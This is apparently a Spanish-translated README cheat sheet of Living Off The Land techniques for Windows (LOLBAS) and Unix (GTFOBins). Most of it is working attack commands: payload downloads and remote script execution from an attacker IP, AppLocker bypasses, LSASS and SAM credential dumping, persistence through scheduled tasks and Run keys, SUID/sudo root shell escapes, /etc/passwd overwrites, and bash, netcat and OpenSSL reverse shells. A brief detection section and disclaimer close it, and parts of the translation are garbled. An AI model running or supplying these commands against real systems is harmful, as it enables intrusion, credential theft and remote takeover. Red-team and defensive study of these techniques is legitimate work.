<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏹 Vivir de la tierra (LOLBAS y GTFOBins) - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
  ██╗      ██████╗ ██╗     ██████╗  █████╗ ███████╗    ██████╗ ████████╗███████╗ ██████╗ 
  ██║     ██╔═══██╗██║     ██╔══██╗██╔══██╗██╔════╝   ██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗
  ██║     ██║   ██║██║     ██████╔╝███████║███████╗   ██║  ███╗   ██║   █████╗  ██║   ██║
  ██║     ██║   ██║██║     ██╔══██╗██╔══██║╚════██║   ██║   ██║   ██║   ██╔══╝  ██║   ██║
  ███████╗╚██████╔╝███████╗██████╔╝██║  ██║███████║██╗╚██████╔╝   ██║   ██║     ╚██████╔╝
  ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ 
                 Living Off The Land (Windows LOLBAS & Unix GTFOBins)
```
<p align="centro">
  <img src="https://img.shields.io/badge/LOLBAS-Windows_Binaries-blue?style=for-the-badge" alt="LOLBAS">
  <img src="https://img.shields.io/badge/GTFOBins-Unix_PrivEsc-orange?style=for-the-badge" alt="GTFOBins">
  <img src="https://img.shields.io/badge/Defense_Evasion-Fileless-red?style=for-the-badge" alt="Evasión de defensa">
  <img src="https://img.shields.io/badge/Living_Off_The_Land-Techniques-green?style=for-the-badge" alt="Vivir de la tierra">
</p>

<p align="centro">
  <b>🛠️ Referencia completa sobre el abuso de archivos binarios legítimos del sistema preinstalados para ejecutar código, descargar cargas útiles y escalar privilegios</b>
</p>

---

## 📋 Tabla de contenidos

- [Introducción](#-introducción)
- [¿Por qué vivir de la tierra?](#-porque-vivir-de-la-tierra)
- [Parte 1: Windows LOLBAS](#-parte-1-windows-lolbas)
  - [Descarga e ingreso de archivos] (#descarga de archivos--ingreso)
  - [Ejecución de código y omisión de AppLocker](#ejecución de código--omisión-applocker)
  - [Volcado de credenciales (LSASS, SAM, LSA)](#credential-dumping-lsass-sam-lsa)
  - [Reconocimiento y descubrimiento](#reconocimiento--descubrimiento)
  - [Persistencia y tareas programadas] (#persistencia-tareas programadas)
- [Parte 2: GTFOBins de Unix/Linux](#-part-2-unix--linux-gtfobins)
  - [Escapes de SUID y Sudo Shell](#suid--sudo-shell-escapes)
  - [Explotación de lectura y escritura de archivos](#file-read--write-exploitation)
  - [Ingreso a la red y shells inversos] (#ingress-network--shells-inversos)
  - [Intérpretes de alto impacto GTFOBins](#gtfobins-intérpretes-de-alto-impacto)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y detección](#-consideraciones-defensivas--detección)
- [Aviso legal](#-aviso-legal)
- [Recursos](#-recursos)

---

## 🎯 Introducción

**Living Off The Land (LotL)** es una técnica posterior a la explotación en la que los atacantes y los equipos rojos utilizan exclusivamente archivos binarios, scripts y bibliotecas de sistemas legítimos, integrados y confiables que ya están presentes en el sistema operativo.

- **LOLBAS (Windows):** Vivir de la tierra: binarios, scripts y bibliotecas.
- **GTFOBins (Unix/Linux):** Colección seleccionada de archivos binarios de Unix de los que se puede abusar para eludir las restricciones de seguridad locales, escapar de shells restringidos y escalar privilegios.

---

## ⚖️ ¿Por qué vivir de la tierra?

1. 🛡️ **Evita la lista blanca de aplicaciones:** Los archivos binarios como `certutil.exe`, `rundll32.exe` o `find` están firmados digitalmente por Microsoft o proveedores de sistemas operativos y AppLocker, WDAC y SELinux confían en ellos.
2. 👁️ **Evade AV/EDR basado en firmas:** No se coloca ningún ejecutable malicioso externo (`.exe`, `.elf`) en el disco.
3. 📉 **Baja huella operativa:** Reduce las anomalías forenses de registros mediante el uso de herramientas de administración nativas.

---

## 🪟 Parte 1: Windows LOLBAS

### Descarga e ingreso de archivos

#### 1. Certutil.exe
```cmd
:: Download file and decode from base64
certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\shell.exe

:: Base64 encode and decode local files
certutil.exe -encode payload.exe encoded.txt
certutil.exe -decode encoded.txt payload.exe
```
#### 2. Bitsadmin.exe
```cmd
:: Asynchronous background download
bitsadmin.exe /transfer myDownloadJob /download /priority FOREGROUND http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe
```
#### 3. Curl.exe y PowerShell
```powershell
:: Built-in curl (Windows 10+)
curl.exe -o C:\Windows\Temp\tool.exe http://10.10.14.5/tool.exe

:: PowerShell download string
powershell -nop -c "Invoke-WebRequest -Uri 'http://10.10.14.5/s.ps1' -OutFile '$env:TEMP\s.ps1'"
```
---

### Ejecución de código y omisión de AppLocker

#### 1. Mshta.exe (Ejecutar HTA/VBScript remoto)
```cmd
:: Execute malicious HTA script directly from remote URL (bypasses AppLocker)
mshta.exe http://10.10.14.5/payload.hta

:: Inline VBScript execution
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c calc.exe"""))
```
#### 2. Regsvr32.exe (Técnica Squiblydoo)
```cmd
:: Executes remote scriptlet (.sct) via COM without touching disk
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
```
#### 3. Rundll32.exe
```cmd
:: Execute exported DLL function
rundll32.exe payload.dll,EntryPoint

:: Execute JavaScript in memory
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Pwned');
```
#### 4. Wmic.exe (ejecución de script XSL)
```cmd
:: Execute arbitrary code via XSL stylesheet
wmic.exe process get brief /format:"http://10.10.14.5/script.xsl"
```
#### 5. Installutil.exe
```cmd
:: Execute unmanaged code inside signed .NET installer (bypasses AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U MaliciousApp.exe
```
---

### Volcado de credenciales (LSASS, SAM, LSA)

#### 1. Rundll32.exe + Comsvcs.dll (volcado de LSASS)
Vuelque la memoria del proceso LSASS sin descartar Mimikatz:
```powershell
# Find LSASS Process ID
$lsassPid = (Get-Process lsass).Id

# Create minidump using built-in comsvcs.dll (Requires Administrator)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
```
#### 2. Reg.exe (Guardar colmenas SAM, SISTEMA y SEGURIDAD)
```cmd
:: Dump local credential hives for offline extraction
reg.exe save HKLM\SAM C:\Windows\Temp\sam.hive
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg.exe save HKLM\SECURITY C:\Windows\Temp\security.hive
```
---

### Reconocimiento y descubrimiento
```cmd
:: Find internal domain controllers
nltest /dclist:domain.local

:: List domain trust relationships
nltest /domain_trusts

:: Query Active Directory computers and users without RSAT
dsquery computer
dsquery user -name *admin*

:: Check active network connections with process IDs
netstat -ano
```
---

### Persistencia y tareas programadas
```cmd
:: Create scheduled task running every 15 minutes as SYSTEM
schtasks.exe /create /tn "SecurityHealthService" /tr "C:\Windows\Temp\agent.exe" /sc minute /mo 15 /ru "NT AUTHORITY\SYSTEM"

:: Add Registry Run Key for current user
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```
---

## 🐧 Parte 2: GTFOBins de Unix/Linux

### Escapes de SUID y Sudo Shell

Cuando un binario tiene SUID configurado (`chmod u+s`) o se otorga en `sudo -l`, abusa de él para un shell raíz inmediato:

#### 1. Sudo/SUID `find`
```bash
# SUID
find . -exec /bin/sh -p \; -quit

# Sudo
sudo find . -exec /bin/sh \; -quit
```
#### 2. Sudo / SUID `vim` / `vi`
```bash
# Escape from inside vim
:!/bin/sh

# One-liner execution
vim -c ':!/bin/sh'
```
#### 3. Sudo/SUID `awk`
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```
#### 4. Sudo/SUID `tar`
```bash
# Checkpoint command execution
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
#### 5. Sudo/SUID `nano`
```bash
# Inside nano: Press Ctrl+R, then Ctrl+X, then type:
reset; sh 1>&0 2>&0
```
#### 6. Sudo/SUID `env`
```bash
# SUID
env /bin/sh -p

# Sudo
sudo env /bin/sh
```
#### 7. Sudo `less` / `more` / `man`
```bash
# Inside pager: Type !/bin/sh and press Enter
!/bin/sh
```
---

### Explotación de lectura y escritura de archivos

Cuando no pueda generar un shell directamente, utilice utilidades de lectura/escritura de archivos para sobrescribir `/etc/passwd` o leer `/etc/shadow`:

#### Sobrescribir `/etc/passwd` mediante Sudo/SUID `tee`
```bash
# Generate password hash: openssl passwd -1 -salt evil P@ss123
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su root2
```
#### Leer archivos confidenciales a través de binarios SUID
```bash
# Base64
base64 /etc/shadow | base64 --decode

# Xxd
xxd /etc/shadow | xxd -r

# Head / Tail
head -n 100 /etc/shadow
```
---

### Ingreso de red y shells inversos

Transfiera archivos y pop shells sin `curl` o `wget`:

#### 1. Shell inverso de TCP nativo de Bash
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```
#### 2. Netcat nativo (sin bandera `-e`)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```
#### 3. Shell inverso cifrado OpenSSL
Sobre el atacante:
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```
En el objetivo:
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```
---

### Intérpretes de alto impacto de GTFOBins

Si a los intérpretes se les concede Sudo / SUID:
```bash
# Python
sudo python3 -c 'import os; os.system("/bin/sh")'

# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# PHP
sudo php -r "system('/bin/sh');"

# Lua
sudo lua -e 'os.execute("/bin/sh")'
```
---

## 📊 Tabla de referencia rápida

| SO | Binario | Propósito | Comando de Abuso |
|----|--------|---------|---------------|
| **Gana** | `certutil.exe` | Descargar archivo | `certutil -urlcache -split -f http://<IP>/file out.exe` |
| **Gana** | `mshta.exe` | Ejecutivo remoto de HTA | `mshta http://<IP>/payload.hta` |
| **Gana** | `regsvr32.exe` | Ejecutivo de scriptlet | `regsvr32 /s /n /u /i:http://<IP>/s.sct scrobj.dll` |
| **Gana** | `rundll32.exe` | Volcado de LSASS | `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full` |
| **Unix**| `find` | Carcasa SUID | `find . -exec /bin/sh -p \; -quit` |
| **Unix**| `awk` | Sudo Shell | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| **Unix**| `vim` | Escape de concha | `vim -c ':!/bin/sh'` |
| **Unix**| `tee` | Sobrescribir archivos | `echo "root2:..." \| sudo tee -a /etc/passwd` |

---

## 🛡️ Consideraciones defensivas y detección

1. **Auditar registro de línea de comandos:**
   Habilite **Sysmon (ID de evento 1)** y el registro de creación de procesos de Windows (ID de evento 4688) con auditoría de línea de comandos para monitorear los argumentos anómalos pasados a `certutil`, `mshta` y `rundll32`.
2. **Block Malicious Parent-Child Relationships:**
   Monitor `mshta.exe` or `regsvr32.exe` spawning `cmd.exe` or `powershell.exe`.
3. **Restringir directivas Sudo:**
   Evite los comodines (`*`) en `/etc/sudoers`. Never allow users to run text editors (`vim`, `nano`) or compilers as root.

---

## ⚠️ Aviso legal

> **IMPORTANT:** Living Off The Land techniques abuse trusted administrative utilities. This cheatsheet is strictly for authorized security assessments, defensive hardening, and educational study.

---

## 📚 Recursos

- [LOLBAS Project Official Repository](https://lolbas-project.github.io/)
- [GTFOBins Official Repository](https://gtfobins.github.io/)
- [MITRE ATT&CK: Subverting Trust Controls (T1564)](https://attack.mitre.org/techniques/T1564/)